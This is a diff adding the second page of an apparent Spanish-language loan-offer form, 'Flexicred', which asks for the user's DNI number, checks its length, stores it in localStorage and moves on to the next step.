@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Flexicred - Paso 2</title>
+    <style>
+        input:-webkit-autofill { -webkit-box-shadow: 0 0 0px 1000px white inset !important; }
+        .error-label { color: #ef4444; font-size: 0.75rem; font-weight: 700; margin-top: 5px; display: none; }
+    </style>
+</head>
+<body style="background: #f8fafc; margin: 0;">
+
+    <div class="app-container">
+        <header style="background: var(--primary); padding: 35px 25px 55px 25px;">
+            <div class="brand-container">
+                <div class="logo-placeholder">
+                    <img src="images/logo.png" alt="flexicred" onerror="this.parentElement.style.background='#fff'">
+                </div>
+                <h1 style="margin: 0; font-size: 1.6rem; font-weight: 800; color: white;">Flexicred</h1>
+            </div>
+            <p style="color: rgba(255,255,255,0.8); margin-top: 10px; font-size: 0.9rem;">Paso 2: Documentación</p>
+        </header>
+
+        <div class="content-card" style="margin-top: -35px;">
+            <div style="margin-bottom: 20px;">
+                <label style="display: block; margin-bottom: 8px; font-weight: 700; color: #1e293b; font-size: 0.85rem; text-transform: uppercase;">Número de DNI</label>
+                <input type="number" id="dni-usuario" placeholder="Sin puntos ni espacios" 
+                    style="width: 100%; padding: 16px; border-radius: 12px; border: 1px solid #e2e8f0; box-sizing: border-box; outline: none; font-size: 1rem;">
+                <div id="error-dni" class="error-label">⚠️ Ingresa un DNI válido para continuar</div>
+            </div>
+
+            <p style="font-size: 0.8rem; color: #64748b; line-height: 1.5;">
+                Hola <strong><span class="span-nombre">Cargando...</span></strong>, necesitamos tu DNI para verificar tu oferta disponible.
+            </p>
+        </div>
+
+        <div style="padding: 20px;">
+            <button class="btn-primary" onclick="validarPaso2()">Continuar</button>
+        </div>
+    </div>
+
+    <script>
+        function validarPaso2() {
+            const input = document.getElementById('dni-usuario');
+            const error = document.getElementById('error-dni');
+            
+            // Validamos que tenga entre 7 y 8 dígitos
+            if (input.value.length < 7 || input.value.length > 9) {
+                input.style.borderColor = "#ef4444";
+                error.style.display = "block";
+            } else {
+                localStorage.setItem('dniUsuario', input.value);
+                window.location.href = 'paso3.html';
+            }
+        }
+
+        document.getElementById('dni-usuario').addEventListener('input', function() {
+            this.style.borderColor = "#e2e8f0";
+            document.getElementById('error-dni').style.display = "none";
+        });
+    </script>
+    <script src="main.js"></script>
+</body>
+</html>
